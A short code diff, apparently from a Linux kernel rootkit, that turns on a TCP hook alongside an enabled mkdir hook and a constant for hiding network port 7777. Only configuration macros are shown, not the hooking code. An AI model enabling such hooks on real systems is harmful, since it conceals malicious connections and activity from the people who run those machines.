@@ -16,7 +16,7 @@
 #define pr_fmt(fmt) "%s : " fmt,__func__
 
 // TO ENABLE HOOK JUST CHANGE MACRO VALUE TO 1
-#define TCP_HOOK_IS_ENABLED 0
+#define TCP_HOOK_IS_ENABLED 1
 #define MKDIR_HOOK_IS_ENABLED 1
 // change your desired port number
 #define PORT_HIDING ((unsigned int)7777)
